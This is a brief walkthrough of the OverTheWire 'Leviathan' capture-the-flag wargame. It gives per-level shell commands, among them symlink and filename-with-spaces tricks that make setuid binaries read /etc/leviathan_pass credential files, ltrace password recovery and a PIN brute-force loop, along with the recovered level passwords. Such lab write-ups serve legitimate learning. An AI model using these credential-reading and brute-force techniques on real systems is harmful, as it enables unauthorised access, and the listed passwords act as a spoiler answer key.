# Leviathan

### Level numbers are the current level, password is for the following level

## Level 0

```sh
grep lev .backup/bookmarks.html
```

PPIfmI1qsA

## Level 1

```sh
ltrace ./check
# step through some calls..
strcmp("\n\n\n", "sex")
# Become leviathan2
$ whoami
$ leviathan2
$ cat /etc/leviathan_pass/leviathan2
```
mEh5PNl10e

## Leviathan 2

`printfile` has a bug wherein the internal call to `/bin/cat` will not handle spaces in filenames and thus potentially call more than one file

```sh
touch /tmp/leviathan2/space\ file.txt
ln -s /etc/leviathan_pass/leviathan2 space
~/printfile "/tmp/leviathan2/space file.txt"
```

Q0G8j4sakn

## Leviathan 3

```sh
ltrace ./leviathan3
# ...
> strcmp("kakaka\n", "snlprintf\n")
# pw is snlprintf, drops us into shell as leviathan4
cat /etc/leviathan_pass/leviathan4
```

AgvropI4OA

## Leviathan 4

```sh
cd .trash
./bin
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
```

Decode output with cyberchef binary -> text

EKKlTF1Xqs

## Leviathan 5

```sh
./leviathan5
> Cannot find /tmp/file.log
# binary is looking for that file and cats the output of it, so create a symlink to the leviathan6 password file and we have our flags
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

YZ55XPVk2l

## Leviathan 6

```sh
#!/bin/bash

cd /home/leviathan6
for i in {0000..9999}; do
  ./leviathan6 $i
done
```

With a successful password, we're dropped into a shell as leviathan7

```sh
cat /etc/leviathan_pass/leviathan7
```

8GpZ5f8Hze

## Leviathan 7


